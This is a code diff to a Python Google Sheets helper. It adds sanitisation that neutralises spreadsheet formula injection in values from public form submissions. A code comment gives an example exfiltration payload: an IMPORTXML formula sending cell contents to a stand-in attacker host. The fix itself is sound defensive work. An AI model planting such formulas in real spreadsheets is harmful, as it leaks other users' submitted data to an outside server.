@@ -128,6 +128,27 @@ def _ensure_headers(service, spreadsheet_id: str, sheet_name: str, headers: List
         log.info("Headers written to sheet '%s': %s", sheet_name, headers)
 
 
+
+# Characters that Google Sheets (and Excel/LibreOffice on export) treat as
+# the start of a formula when a cell is written with valueInputOption=
+# USER_ENTERED. Every value that reaches append_row() below originates from
+# a public, unauthenticated form submission, so without this a visitor
+# could submit e.g. =IMPORTXML("https://evil.example/"&A1,"//x") as their
+# name or message and have it execute as a live formula the moment someone
+# opens the spreadsheet — a classic CSV/Formula Injection (CWE-1236) that
+# can exfiltrate other rows to an attacker-controlled server.
+_FORMULA_TRIGGER_CHARS = ("=", "+", "-", "@", "\t", "\r")
+
+
+def _sanitize_cell(value: str) -> str:
+    """Neutralise formula injection by forcing a leading trigger character
+    to be treated as literal text, exactly like Google Sheets/Excel do when
+    a cell value is prefixed with a single quote."""
+    if value and value[0] in _FORMULA_TRIGGER_CHARS:
+        return "'" + value
+    return value
+
+
 def append_row(sheet_name: str, headers: List[str], row: List):
     """
     Append a data row to the specified Google Sheet.
@@ -141,8 +162,9 @@ def append_row(sheet_name: str, headers: List[str], row: List):
         )
         raise ValueError("SPREADSHEET_ID not configured.")
 
-    # Cast everything to string so the API never gets None or int
-    str_row = [str(v).strip() if v is not None else "" for v in row]
+    # Cast everything to string, strip, then neutralise any leading
+    # formula-trigger character before it ever reaches the Sheets API.
+    str_row = [_sanitize_cell(str(v).strip()) if v is not None else "" for v in row]
 
     log.info("Appending to sheet '%s': %s", sheet_name, str_row)
 
